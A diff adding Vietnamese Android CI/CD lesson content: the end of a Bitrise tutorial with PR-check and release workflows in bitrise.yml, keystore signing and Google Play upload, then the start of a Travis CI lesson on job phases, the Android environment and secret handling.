+<div class="callout callout-warn"><span class="callout-icon">⚠️</span><div class="callout-body">File trong <strong>Files</strong> mặc định <strong>mở cho build Pull Request</strong>. Với file khoá, bật <strong>Make protected</strong>: không ai tải lại được file từ tài khoản, biến của file được coi như Secret nên không mở cho PR và dùng được cho input nhạy cảm <code>service_account_json_key_path</code> (input này đòi giá trị là Secret).</div></div>
+
+<p>Hai cách ký AAB:</p>
+
+<ul>
+  <li><strong>Ký trong Gradle</strong> (bài này chọn): <code>file-downloader@2</code> tải keystore về <code>app/release.jks</code>, <code>envs</code> của Workflow ánh xạ <code>BITRISEIO_ANDROID_KEYSTORE_*</code> sang tên chuẩn mà <code>signingConfigs.release</code> của 11.4 đọc; cùng <code>build.gradle.kts</code> chạy trên mọi tool.</li>
+  <li><strong>Step <code>sign-apk@2</code>:</strong> build AAB chưa ký rồi Step ký bằng keystore trong Code signing. Không dùng chung với ký trong Gradle: AAB đã ký thì <code>sign-apk</code> thất bại.</li>
+</ul>
+
+<h2>Ví dụ thực tế</h2>
+
+<p>Hai pipeline chuẩn của Session 11 trong một <code>bitrise.yml</code> ở gốc repo. Chuẩn bị Google Play (service account, AAB đầu tiên upload tay) học ở <a href="github_ci.md" target="_blank" rel="noopener">github_ci.md</a>.</p>
+
+<h3>Pipeline PR check</h3>
+
+<p><strong>Bài toán:</strong> mọi Pull Request vào <code>main</code> phải qua lint, unit test, build debug; report và APK debug lưu cho người review; check đỏ thì không merge.</p>
+
+<p><strong>Luồng chạy:</strong></p>
+
+<ol>
+  <li>PR vào <code>main</code> (không phải nháp) khớp trigger <code>pr-check</code>; push vào <code>main</code> cũng chạy, để ghi cache cho PR sau.</li>
+  <li><code>bundle::setup</code>: clone, chọn JDK 17, khôi phục cache Gradle.</li>
+  <li><code>android-lint</code> chạy <code>lintDebug</code>.</li>
+  <li><code>android-unit-test</code> chạy unit test variant debug.</li>
+  <li><code>android-build</code> chạy <code>assembleDebug</code>.</li>
+  <li><code>deploy-to-bitrise-io</code> luôn chạy, kể cả khi bước 3–5 đỏ, đưa report và APK lên trang build.</li>
+  <li><code>save-gradle-cache</code> chỉ chạy khi build xanh và không phải PR.</li>
+  <li>Bitrise gửi trạng thái <code>bitrise-pr-check</code> về GitHub.</li>
+</ol>
+
+<div class="mermaid">
+flowchart TD
+    A["(1) PR vào main hoặc push main"] --&gt; B["(2) setup: clone, JDK 17, restore cache"]
+    B --&gt; C["(3) android-lint"]
+    C --&gt;|"pass"| D["(4) android-unit-test"]
+    D --&gt;|"pass"| E["(5) android-build"]
+    C --&gt;|"fail"| F
+    D --&gt;|"fail"| F
+    E --&gt; F["(6) deploy-to-bitrise-io"]
+    F --&gt; G{"(7) Xanh và không phải PR?"}
+    G --&gt;|"Có"| H["save-gradle-cache"]
+    G --&gt;|"Không"| I["(8) Gửi trạng thái về GitHub"]
+    H --&gt; I
+</div>
+
+<p><strong>Code:</strong></p>
+
+<pre data-lang="yaml"><code># bitrise.yml (gốc repo): phần chung và Workflow pr-check
+format_version: '25'
+default_step_lib_source: https://github.com/bitrise-io/bitrise-steplib.git
+project_type: android
+
+meta:
+  bitrise.io:
+    stack: ubuntu-noble-24.04-bitrise-2025-android
+
+app:
+  envs:
+  - PACKAGE_NAME: com.example.bookstore
+
+step_bundles:
+  setup:                                           # (2)
+    steps:
+    - git-clone@8: {}
+    - set-java-version@1:
+        inputs:
+        - set_java_version: "17"
+    - restore-gradle-cache@3: {}
+
+workflows:
+  pr-check:
+    status_report_name: bitrise-pr-check           # (8) tên check cố định
+    triggers:
+      pull_request:
+      - target_branch: main                        # (1)
+        draft_enabled: false
+      push:
+      - branch: main                               # (1)
+    steps:
+    - bundle::setup: {}                            # (2)
+    - android-lint@1:                              # (3)
+        inputs:
+        - variant: debug
+    - android-unit-test@1:                         # (4)
+        inputs:
+        - variant: debug
+    - android-build@1:                             # (5)
+        inputs:
+        - variant: debug
+        - build_type: apk
+    - deploy-to-bitrise-io@2: {}                   # (6)
+    - save-gradle-cache@1:                         # (7)
+        run_if: ".IsCI | and (not .IsPR)"</code></pre>
+
+<p>Gộp ba task vào một <code>gradle-runner@6</code> cũng được, nhưng phải tự gom report và mất tab Test Reports.</p>
+
+<p><strong>Kết quả:</strong> PR có check <code>bitrise-pr-check</code>; tab <strong>Artifacts</strong> có <code>lint-results-debug.html</code>, report test, <code>app-debug.apk</code>; tab <strong>Test Reports</strong> liệt kê từng test case. Đặt <code>bitrise-pr-check</code> làm required status check (<a href="github_ci.md" target="_blank" rel="noopener">github_ci.md</a>) thì PR đỏ không merge được.</p>
+
+<h3>Pipeline Release</h3>
+
+<p><strong>Bài toán:</strong> push tag <code>v1.4.0</code> thì build AAB đã ký, versionCode tự tăng, lưu AAB và <code>mapping.txt</code>, upload lên internal track.</p>
+
+<p><strong>Luồng chạy:</strong></p>
+
+<ol>
+  <li>Push tag khớp <code>v*</code> kích hoạt <code>release</code> (không phải PR nên Secrets dùng được).</li>
+  <li><code>bundle::setup</code> clone commit của tag, chọn JDK 17, khôi phục cache.</li>
+  <li><code>file-downloader</code> tải keystore về <code>app/release.jks</code>, quyền <code>600</code>.</li>
+  <li><code>gradle-runner</code> chạy <code>bundleRelease</code>, ký bằng các biến đã ánh xạ ở <code>envs</code>, versionCode từ <code>BITRISE_BUILD_NUMBER</code>; Step copy AAB và <code>mapping.txt</code> vào <code>$BITRISE_DEPLOY_DIR</code>, ghi <code>BITRISE_AAB_PATH</code>.</li>
+  <li><code>deploy-to-bitrise-io</code> lưu AAB và <code>mapping.txt</code> làm artifact.</li>
+  <li><code>google-play-deploy</code> tải khoá service account (file đã Make protected), upload AAB lên track <code>internal</code>.</li>
+</ol>
+
+<div class="mermaid">
+sequenceDiagram
+    participant Dev as Developer
+    participant B as Bitrise VM
+    participant Store as Code Signing và Files
+    participant Play as Google Play
+    Dev-&gt;&gt;B: (1) git push origin v1.4.0
+    B-&gt;&gt;B: (2) setup: clone tag, JDK 17, restore cache
+    B-&gt;&gt;Store: (3) tải keystore về app/release.jks
+    B-&gt;&gt;B: (4) gradle-runner bundleRelease, ký bằng signingConfigs.release
+    B-&gt;&gt;B: (5) deploy-to-bitrise-io lưu AAB và mapping.txt
+    B-&gt;&gt;Store: (6) tải khoá service account
+    B-&gt;&gt;Play: (6) upload AAB lên internal track
+</div>
+
+<p><strong>Code:</strong></p>
+
+<pre data-lang="yaml"><code># bitrise.yml (gốc repo): thêm Workflow release vào khối workflows ở trên
+workflows:
+  release:
+    triggers:
+      tag:
+      - name: "v*"                                 # (1) v1.4.0, v2.0.0-rc1
+      # chặt hơn: - name: { regex: '^v\\d+\\.\\d+\\.\\d+$' }
+    envs:                                          # (4) ánh xạ sang tên chuẩn của 11.4
+    - RELEASE_STORE_FILE: release.jks
+    - RELEASE_STORE_PASSWORD: $BITRISEIO_ANDROID_KEYSTORE_PASSWORD
+    - RELEASE_KEY_ALIAS: $BITRISEIO_ANDROID_KEYSTORE_ALIAS
+    - RELEASE_KEY_PASSWORD: $BITRISEIO_ANDROID_KEYSTORE_PRIVATE_KEY_PASSWORD
+    steps:
+    - bundle::setup: {}                            # (2)
+    - file-downloader@2:                           # (3)
+        inputs:
+        - source: $BITRISEIO_ANDROID_KEYSTORE_URL
+        - destination: app/release.jks
+        - file_permission: "600"
+    - gradle-runner@6:                             # (4)
+        inputs:
+        - gradle_task: bundleRelease
+        - gradle_options: --stacktrace -PversionCode=$BITRISE_BUILD_NUMBER
+    - deploy-to-bitrise-io@2: {}                   # (5)
+    - google-play-deploy@4:                        # (6)
+        inputs:
+        - service_account_json_key_path: $BITRISEIO_PLAY_SERVICE_ACCOUNT_JSON_URL
+        - package_name: $PACKAGE_NAME
+        - app_path: $BITRISE_AAB_PATH
+        - track: internal
+        - status: completed</code></pre>
+
+<p>Gradle dùng đúng <code>signingConfigs.release</code> và property <code>versionCode</code> chuẩn ở <a href="github_ci.md" target="_blank" rel="noopener">github_ci.md</a>. Input của Step chỉ thay biến, không tính biểu thức shell: muốn cộng offset như 11.4 (<code>1000 +</code> số build) thì gọi Gradle bằng <code>script@1</code> hoặc để Gradle tự cộng. Mọi Workflow trong một lần chạy Pipeline dùng chung một <code>BITRISE_BUILD_NUMBER</code>.</p>
+
+<p>Input khác của <code>google-play-deploy@4</code>: <code>user_fraction</code> (staged rollout, khi <code>status</code> là <code>inProgress</code> hoặc <code>halted</code>), <code>whatsnews_dir</code> (file <code>whatsnew-&lt;locale&gt;</code> làm release notes), <code>dry_run</code>. Từ 4.0.0, <code>mapping_file</code> mặc định trống vì AAB có minify đã chứa mapping; <code>mapping.txt</code> vẫn lưu làm artifact cho Crashlytics (<a href="../coding_analyst_and_testing/fit_bug_optimization.md" target="_blank" rel="noopener">10.4</a>).</p>
+
+<p><strong>Kết quả:</strong> trang build có artifact AAB và <code>mapping.txt</code>, log <code>gradle-runner</code> có <code>BUILD SUCCESSFUL</code>; <strong>Play Console → Testing → Internal testing</strong> có release mới với versionCode bằng số build Bitrise.</p>
+
+<div class="callout callout-important"><span class="callout-icon">🔴</span><div class="callout-body">Ví dụ không có bước duyệt tay như environment có required reviewer của GitHub Actions. Bù lại: giới hạn người được push tag <code>v*</code> bằng ruleset, chỉ tự động lên internal track, promote lên production làm tay trên Play Console.</div></div>
+
+<h2>Khi nào nên và không nên dùng</h2>
+
+<p><strong>Nên:</strong> team mobile không muốn vận hành máy build; app có cả iOS (Workflow iOS đặt <code>meta</code> với stack macOS) cần ký hai nền tảng ở một chỗ; muốn bước mobile có sẵn dạng Step có version.</p>
+
+<p><strong>Không nên:</strong> mã nguồn không được rời mạng công ty (<a href="jenkins.md" target="_blank" rel="noopener">Jenkins</a>); code ở GitHub, chỉ build Android, team quen GitHub Actions (<a href="github_ci.md" target="_blank" rel="noopener">Github CI</a>); cần phần cứng mà stack không có.</p>
+
+<p><strong>Cái giá:</strong> chi phí theo gói (thời gian và loại máy; Workspace secrets chỉ có ở gói Enterprise; Build Cache là sản phẩm riêng; xem trang giá), và <strong>lệ thuộc nền tảng</strong>: Step, trigger, Code Signing &amp; Files là của riêng Bitrise. Giữ logic build (ký, versionCode) trong Gradle để khi chuyển đi chỉ viết lại lớp điều phối.</p>
+
+<h2>Sai lầm thường gặp</h2>
+
+<h3>1. Không pin version Step</h3>
+
+<pre data-lang="yaml"><code>- google-play-deploy: {}        # không @version: luôn lấy bản mới nhất</code></pre>
+
+<p><strong>Lỗi lộ ra thế nào:</strong> build đổi hành vi dù không ai sửa <code>bitrise.yml</code>. Ví dụ <code>google-play-deploy</code> 4.0.0 thôi gửi <code>mapping_file</code> mặc định: upload APK bỗng không còn mapping trên Play.</p>
+
+<p><strong>Cách sửa:</strong> pin major (<code>google-play-deploy@4</code>), đọc release notes của Step trước khi nâng major.</p>
+
+<h3>2. Đưa URL keystore vào Gradle như đường dẫn file</h3>
+
+<pre data-lang="kotlin"><code>storeFile = file(System.getenv("BITRISEIO_ANDROID_KEYSTORE_URL"))   // sai: đây là URL https</code></pre>
+
+<p><strong>Lỗi lộ ra thế nào:</strong> <code>bundleRelease</code> thất bại vì không tìm thấy keystore.</p>
+
+<p><strong>Cách sửa:</strong> tải về bằng <code>file-downloader</code> trong cùng build (URL có hạn dùng), Gradle đọc đường dẫn file.</p>
+
+<h3>3. Mở secret hoặc file khoá cho build Pull Request</h3>
+
+<p><strong>Lỗi lộ ra thế nào:</strong> bật Expose for Pull Requests cho PR check "chạy được", hoặc để khoá service account trong Files không Make protected: ai mở được PR cũng sửa code để gửi giá trị ra ngoài; <code>[REDACTED]</code> chỉ che log.</p>
+
+<p><strong>Cách sửa:</strong> PR check không dùng secret; file khoá luôn Make protected; việc cần secret chạy trên nhánh bảo vệ hoặc tag.</p>
+
+<h3>4. Lưu cache từ build PR</h3>
+
+<pre data-lang="yaml"><code>- save-gradle-cache@1: {}       # thiếu run_if: build PR cũng ghi cache</code></pre>
+
+<p><strong>Lỗi lộ ra thế nào:</strong> cache do code PR chưa review tạo ra được build <code>main</code> và release tải về.</p>
+
+<p><strong>Cách sửa:</strong> thêm <code>run_if: ".IsCI | and (not .IsPR)"</code>.</p>
+
+<h2>Lịch sử phát triển</h2>
+
+<ul>
+  <li><strong>10/2014:</strong> Bitrise thành lập ở Budapest; Bitrise CLI và Step Library là mã nguồn mở.</li>
+  <li><strong>Sau đó (không rõ năm):</strong> key-based caching ra khỏi beta, branch-based caching thành legacy.</li>
+  <li><strong>Khoảng cuối 2024:</strong> Pipeline chuyển từ stages sang đồ thị <code>depends_on</code>.</li>
+  <li><strong>01/2025:</strong> target-based trigger trong Workflow/Pipeline, thay cho <code>trigger_map</code>.</li>
+  <li><strong>2026:</strong> Ubuntu Noble 24.04 (Bitrise 2025 Edition) thành stack Linux Stable, <code>linux-docker-android-22.04</code> bị đóng băng; <code>gradle-runner</code> 6.0.0 và <code>google-play-deploy</code> 4.0.0 (08/2026) đổi cách xử lý <code>mapping.txt</code>; <code>android-lint</code> 1.0.0 (10/2026) bỏ tích hợp cache legacy.</li>
+</ul>
+
+<h2>Kết nối hệ thống</h2>
+
+<ul>
+  <li><strong>Tiên quyết:</strong> <a href="index.md" target="_blank" rel="noopener">11.0 Tổng quan</a> (pipeline Android); <a href="github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a> (secret, <code>signingConfigs.release</code>, versionCode, service account, track, required status check); <a href="../session_04/android_manifest/package_build_gradle/build_types.md" target="_blank" rel="noopener">Build Types</a> (variant release, <code>mapping.txt</code>).</li>
+  <li><strong>Liên quan:</strong> <a href="../session_01/output_packages/aab_files.md" target="_blank" rel="noopener">AAB</a> (upload key, Play App Signing); <a href="../session_04/android_manifest/package_build_gradle/flavor.md" target="_blank" rel="noopener">Flavor</a> (task theo variant); <a href="../coding_analyst_and_testing/lint.md" target="_blank" rel="noopener">10.3 Lint</a>, <a href="../coding_analyst_and_testing/unit_testing.md" target="_blank" rel="noopener">10.2 Unit Testing</a> (task mà Step lint, unit test gọi); <a href="../coding_analyst_and_testing/fit_bug_optimization.md" target="_blank" rel="noopener">10.4 Fit / Bug Optimization</a> (<code>mapping.txt</code> để đọc crash).</li>
+  <li><strong>Học tiếp:</strong> <a href="jenkins.md" target="_blank" rel="noopener">11.1 Jenkins</a> (hạ tầng tự quản), <a href="travis_ci.md" target="_blank" rel="noopener">11.3 Travis CI</a> (công cụ cũ và cách migrate).</li>
+</ul>
+
+<h2>Tham khảo</h2>
+
+<ul>
+  <li>Bitrise Docs: <a href="https://docs.bitrise.io/en/bitrise-ci/references/configuration-yaml-reference" target="_blank" rel="noopener">Configuration YAML reference</a>, <a href="https://docs.bitrise.io/en/bitrise-ci/run-and-analyze-builds/build-triggers/yaml-syntax-for-build-triggers" target="_blank" rel="noopener">YAML syntax for build triggers</a>, <a href="https://docs.bitrise.io/en/bitrise-ci/workflows-and-pipelines/build-pipelines/configuring-a-bitrise-pipeline" target="_blank" rel="noopener">Configuring a Bitrise Pipeline</a>, <a href="https://docs.bitrise.io/en/bitrise-ci/workflows-and-pipelines/steps/step-bundles" target="_blank" rel="noopener">Step bundles</a>, <a href="https://docs.bitrise.io/en/bitrise-ci/configure-builds/configuration-yaml/storing-an-apps-configuration-yaml" target="_blank" rel="noopener">Storing an app's configuration YAML</a>, <a href="https://docs.bitrise.io/en/bitrise-ci/configure-builds/configuring-build-settings/setting-the-stack-for-your-builds" target="_blank" rel="noopener">Setting the stack for your builds</a>, <a href="https://docs.bitrise.io/en/bitrise-platform/infrastructure/build-stacks/linux-stack-update-policy" target="_blank" rel="noopener">Linux stack update policy</a></li>
+  <li>Bitrise Docs: <a href="https://docs.bitrise.io/en/bitrise-ci/configure-builds/environment-variables" target="_blank" rel="noopener">Environment variables</a>, <a href="https://docs.bitrise.io/en/bitrise-ci/references/available-environment-variables" target="_blank" rel="noopener">Available environment variables</a>, <a href="https://docs.bitrise.io/en/bitrise-ci/configure-builds/secrets" target="_blank" rel="noopener">Secrets</a>, <a href="https://docs.bitrise.io/en/bitrise-ci/code-signing/android-code-signing/uploading-android-keystore-files-to-bitrise" target="_blank" rel="noopener">Uploading Android keystore files to Bitrise</a>, <a href="https://docs.bitrise.io/en/bitrise-ci/code-signing/android-code-signing/android-code-signing-in-gradle" target="_blank" rel="noopener">Android code signing in Gradle</a>, <a href="https://docs.bitrise.io/en/bitrise-ci/run-and-analyze-builds/managing-build-files/uploading-files-for-your-builds" target="_blank" rel="noopener">Uploading files for your builds</a>, <a href="https://docs.bitrise.io/en/bitrise-ci/getting-started/quick-start-guides/getting-started-with-android-projects" target="_blank" rel="noopener">Getting started with Android projects</a></li>
+  <li>Bitrise Docs: <a href="https://docs.bitrise.io/en/bitrise-ci/dependencies-and-caching/key-based-caching/using-key-based-caching" target="_blank" rel="noopener">Using key-based caching</a>, <a href="https://docs.bitrise.io/en/bitrise-ci/workflows-and-pipelines/workflows/generic-workflow-recipes/make-caching-efficient-for-pull-request-builds" target="_blank" rel="noopener">Make caching efficient for pull request builds</a>, <a href="https://docs.bitrise.io/en/bitrise-build-cache/build-cache-for-gradle/configuring-the-build-cache-for-gradle-in-the-bitrise-ci-environment" target="_blank" rel="noopener">Build Cache for Gradle</a></li>
+  <li><a href="https://github.com/bitrise-io/bitrise-steplib" target="_blank" rel="noopener">bitrise-io/bitrise-steplib</a> (<code>step.yml</code> và version của từng Step); release notes <a href="https://github.com/bitrise-steplib/steps-google-play-deploy/releases" target="_blank" rel="noopener">steps-google-play-deploy</a>, <a href="https://github.com/bitrise-steplib/steps-gradle-runner/releases" target="_blank" rel="noopener">steps-gradle-runner</a>, <a href="https://github.com/bitrise-steplib/bitrise-step-android-lint/releases" target="_blank" rel="noopener">bitrise-step-android-lint</a>, <a href="https://github.com/bitrise-steplib/steps-sign-apk" target="_blank" rel="noopener">steps-sign-apk</a></li>
+  <li>Diễn đàn Bitrise: <a href="https://discuss.bitrise.io/t/new-feature-alert-target-based-build-triggers/24714" target="_blank" rel="noopener">Target-based build triggers</a>, <a href="https://discuss.bitrise.io/t/pipeline-build-number-as-bitrise-build-number/22370" target="_blank" rel="noopener">BITRISE_BUILD_NUMBER trong Pipeline</a></li>
+</ul>
+    `
+  },
+
+  'travis-ci': {
+    title: 'Travis CI',
+    summary: 'Travis CI là dịch vụ CI dạng SaaS đọc .travis.yml ở gốc repo; mỗi push hoặc Pull Request tạo một build gồm các job chạy trong máy ảo sạch, mỗi job đi qua chuỗi phase cố định. Bài nói rõ hiện trạng, viết lại PR check cho Android, giữ keystore bằng travis encrypt-file và migrate sang GitHub Actions.',
+    status: 'published',
+    difficulty: 'intermediate',
+    estimatedReadingTime: '11 phút',
+    depth: 'standard',
+    tags: ['android', 'session-11', 'cicd', 'travis-ci', 'travis-yml', 'migration', 'github-actions'],
+    domain: 'Android',
+    module: 'Session 11',
+    prerequisites: ['android.cicd.overview', 'android.cicd.github_ci', 'android.manifest.build_types'],
+    related: ['android.cicd.jenkins', 'android.cicd.bitrise', 'android.testing.lint', 'android.testing.unit_testing', 'android.output_packages.aab_files', 'android.manifest.product_flavors'],
+    learningOutcomes: [
+      'Giải thích được mô hình build, stage, job và phase của Travis CI cùng hiện trạng của dịch vụ với dự án Android.',
+      'Triển khai được pipeline PR check cho dự án Android bằng .travis.yml với language android, JDK 17, SDK component và cache Gradle.',
+      'Xử lý được secret trên Travis CI bằng biến trong Repository Settings, giá trị secure và travis encrypt-file cho keystore.',
+      'Áp dụng được bảng ánh xạ khái niệm để migrate một .travis.yml sang workflow GitHub Actions.'
+    ],
+    knowledgeGap: 'Repo Android cũ còn .travis.yml và badge "build passing" dù build đã ngừng từ lâu. Không hiểu lifecycle của Travis thì khó biết cấu hình cũ còn chạy không, dễ để component SDK cài lỗi mà không hay, chặn mất build trên tag, hoặc migrate mà quên secret và versionCode.',
+    updatedAt: '2026-11-10',
+    readTime: '11 phút',
+    content: `
+<h2>Vấn đề cần giải quyết</h2>
+
+<p>Bạn nhận một repo Android cũ có <code>.travis.yml</code> và badge <code>build passing</code>:</p>
+
+<pre data-lang="yaml"><code># .travis.yml còn sót lại trong nhiều repo Android cũ
+language: android
+dist: trusty
+android:
+  components:
+    - tools
+    - build-tools-28.0.3
+    - android-28
+script: ./gradlew build</code></pre>
+
+<p>Badge trỏ tới <code>travis-ci.org</code> (đã ngừng build từ 2021), <code>trusty</code> không còn hỗ trợ Android, <code>android-28</code> quá cũ so với <code>compileSdk</code>, và Pull Request đang merge mà không có cổng kiểm tra. Bạn cần biết cấu hình này <strong>nghĩa là gì</strong>, <strong>còn chạy được không</strong>, và nếu chuyển đi thì <strong>mang theo những gì</strong>.</p>
+
+<h2>Sau khi học xong</h2>
+
+<ul>
+  <li>Giải thích được mô hình build, stage, job và phase của Travis CI cùng hiện trạng của dịch vụ với dự án Android.</li>
+  <li>Triển khai được pipeline PR check cho dự án Android bằng .travis.yml với language android, JDK 17, SDK component và cache Gradle.</li>
+  <li>Xử lý được secret trên Travis CI bằng biến trong Repository Settings, giá trị secure và travis encrypt-file cho keystore.</li>
+  <li>Áp dụng được bảng ánh xạ khái niệm để migrate một .travis.yml sang workflow GitHub Actions.</li>
+</ul>
+
+<h2>Travis CI là gì?</h2>
+
+<p><strong>Travis CI</strong> là dịch vụ CI dạng SaaS đọc file <code>.travis.yml</code> ở gốc repo; mỗi lần có push hoặc Pull Request, nó tạo một <strong>build</strong> gồm một hay nhiều <strong>job</strong>, mỗi job chạy trong một máy ảo sạch và đi qua một chuỗi <strong>phase</strong> cố định gọi là <strong>job lifecycle (vòng đời job)</strong>.</p>
+
+<p>Mental model: mỗi job là <strong>dây chuyền có các trạm cố định</strong> (<code>before_install</code> → <code>install</code> → <code>script</code> → ...); bạn chỉ điền lệnh vào trạm, trạm trống thì dùng lệnh mặc định của <code>language</code>. Ở GitHub Actions (<a href="github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a>) bạn tự sắp các step.</p>
+
+<h2>Cách hoạt động</h2>
+
+<h3>Hiện trạng của dịch vụ</h3>
+
+<p>Khi viết bài (11/2026), Travis CI chạy ở <code>travis-ci.com</code> và bản tự host Travis CI Server:</p>
+
+<ul>
+  <li><code>travis-ci.org</code> (miễn phí cho repo public) <strong>đã tắt từ 06/2021</strong>.</li>
+  <li>Build tính theo <strong>credit</strong>; trang Billing ghi "Free Trial Plans are currently unavailable", credit open source chỉ cấp theo yêu cầu. Thực tế cần gói trả phí.</li>
+  <li>Android chạy trên <code>dist: bionic | focal | jammy</code>, <strong>không có macOS</strong>; component cài sẵn dừng ở API 30.</li>
+</ul>
+
+<p>Vì vậy Travis chủ yếu còn ở dự án cũ.</p>
+
+<h3>Build, stage, job và phase</h3>
+
+<ol>
+  <li><strong>Trigger:</strong> push tạo <strong>branch build</strong>; Pull Request tạo <strong>PR build</strong> trên merge commit với nhánh đích.</li>
+  <li><strong>Build:</strong> đọc <code>.travis.yml</code>, tạo job từ matrix hoặc <code>jobs.include</code>.</li>
+  <li><strong>Job:</strong> chạy trên máy ảo mới, <strong>không chia sẻ file</strong> với job khác.</li>
+  <li><strong>Phase:</strong> chạy theo bảng dưới.</li>
+  <li><strong>Báo kết quả:</strong> thành check trên PR; đặt làm required status check (<a href="github_ci.md" target="_blank" rel="noopener">11.4</a>) thì đỏ chặn merge.</li>
+</ol>
+
+<table style="width:100%;border-collapse:collapse;font-size:14px;margin-bottom:1em;">
+  <thead>
+    <tr style="border-bottom:2px solid #30363d;background:var(--bg-card,#161b22);">
+      <th style="padding:8px 12px;text-align:left;">Phase</th>
+      <th style="padding:8px 12px;text-align:left;">Dùng để</th>
+      <th style="padding:8px 12px;text-align:left;">Lệnh lỗi thì</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>before_install</code>, <code>install</code>, <code>before_script</code></td>
+      <td style="padding:8px 12px;">Giải mã secret, cài công cụ</td>
+      <td style="padding:8px 12px;">Build <strong>errored</strong>, dừng ngay</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>script</code></td>
+      <td style="padding:8px 12px;">Build và test chính</td>
+      <td style="padding:8px 12px;">Build <strong>failed</strong>, lệnh còn lại của <code>script</code> vẫn chạy</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>before_cache</code></td>
+      <td style="padding:8px 12px;">Dọn file không nên vào cache</td>
+      <td style="padding:8px 12px;">Chỉ chạy khi có cache</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>after_success</code> / <code>after_failure</code></td>
+      <td style="padding:8px 12px;">Thông báo</td>
+      <td style="padding:8px 12px;">Không đổi kết quả</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>before_deploy</code>, <code>deploy</code>, <code>after_deploy</code></td>
+      <td style="padding:8px 12px;">Phát hành; bỏ qua khi build hỏng hoặc PR build</td>
+      <td style="padding:8px 12px;"><code>before_deploy</code> lỗi thì errored</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>after_script</code></td>
+      <td style="padding:8px 12px;">Dọn dẹp cuối</td>
+      <td style="padding:8px 12px;">Không đổi kết quả</td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="mermaid">
+flowchart TD
+    T["(1) Push hoặc PR"] --&gt; B["(2) Build"]
+    B --&gt; J["(3) Job, máy ảo sạch"]
+    J --&gt; P1["(4) before_install, install, before_script"]
+    P1 --&gt;|"lỗi"| E["Errored, dừng"]
+    P1 --&gt; S["(4) script"]
+    S --&gt; C["(4) before_cache"]
+    C --&gt; R{"script thành công?"}
+    R --&gt;|"Có"| OK["(5) after_success, deploy, check xanh"]
+    R --&gt;|"Không"| KO["(5) after_failure, check đỏ"]
+</div>
+
+<p><strong>Errored</strong> là môi trường hỏng (cài, giải mã không được): sửa <code>.travis.yml</code>. <strong>Failed</strong> là lint hay test đỏ: sửa code.</p>
+
+<h3>Môi trường Android</h3>
+
+<ul>
+  <li><strong><code>language: android</code></strong>: SDK ở <code>/usr/local/android-sdk</code>, set sẵn <code>ANDROID_HOME</code>, <code>ANDROID_SDK_ROOT</code>.</li>
+  <li><strong><code>dist</code></strong>: <code>bionic</code> (cảnh báo deprecated), <code>focal</code> (mặc định), <code>jammy</code> (nên chọn).</li>
+  <li><strong><code>jdk: openjdk17</code></strong>: Jammy có openjdk 8–11 và 17 nhưng <strong>mặc định 11</strong>, còn AGP 8.x cần JDK 17.</li>
+  <li><strong><code>android.components</code></strong>: tên package theo <code>sdkmanager</code> (<code>platforms;android-35</code>). Theo mã nguồn <code>travis-build</code>, Travis chấp nhận license bằng <code>yes | sdkmanager --licenses</code> rồi cài từng component; cài lỗi <strong>chỉ in dòng đỏ, job chạy tiếp</strong>.</li>
+  <li><strong><code>script</code> mặc định</strong> khi có <code>gradlew</code> là <code>./gradlew build connectedCheck</code>; <code>connectedCheck</code> cần emulator nên PR check phải ghi đè.</li>
+</ul>
+
+<p>Cần môi trường khác thì docs có ví dụ <code>language: java</code> tự cài SDK bằng <code>sdkmanager</code>.</p>
+
+<p><strong>Cache</strong> tải về đầu job, upload lại cuối job nếu đổi; lock file Gradle đổi mỗi lần chạy nên phải xoá trong <code>before_cache</code>.</p>
+
+<h3>Biến môi trường và secret</h3>
+
+<table style="width:100%;border-collapse:collapse;font-size:14px;margin-bottom:1em;">
+  <thead>
+    <tr style="border-bottom:2px solid #30363d;background:var(--bg-card,#161b22);">
+      <th style="padding:8px 12px;text-align:left;">Nơi đặt</th>
+      <th style="padding:8px 12px;text-align:left;">Dùng cho</th>
+      <th style="padding:8px 12px;text-align:left;">Ghi chú</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>env</code> trong <code>.travis.yml</code></td>
+      <td style="padding:8px 12px;">Giá trị công khai</td>
+      <td style="padding:8px 12px;">Fork cũng thấy</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>secure: "..."</code> trong <code>.travis.yml</code></td>
+      <td style="padding:8px 12px;">Secret giống nhau mọi nhánh</td>
+      <td style="padding:8px 12px;">Tạo bằng <code>travis encrypt</code> (public key của repo)</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Repository Settings</td>
+      <td style="padding:8px 12px;">Mật khẩu keystore, token</td>
+      <td style="padding:8px 12px;">Tắt "Display value in build log"</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>Travis thay secret dài hơn 3 ký tự bằng <code>[secure]</code> trong log, nhưng không che giá trị đã biến đổi (base64, cắt chuỗi); tránh <code>set -x</code>, <code>env</code>, <code>printenv</code>.</li>
+  <li>Secret <strong>không có</strong> cho PR build từ fork (trừ khi bật chia sẻ), nên PR check không được cần secret.</li>
+  <li><code>travis encrypt-file</code> mã hoá file (AES-256, giải mã bằng <code>openssl aes-256-cbc</code>), lưu khoá vào hai biến <code>encrypted_&lt;id&gt;_key</code>, <code>encrypted_&lt;id&gt;_iv</code> của repo; file <code>.enc</code> được commit. Mã hoá file thứ hai ghi đè cặp khoá, nên gộp nhiều file vào một <code>tar</code>.</li>
+</ul>
+
+<h4>Ví dụ: đưa keystore release và khoá service account lên Travis CI</h4>
+
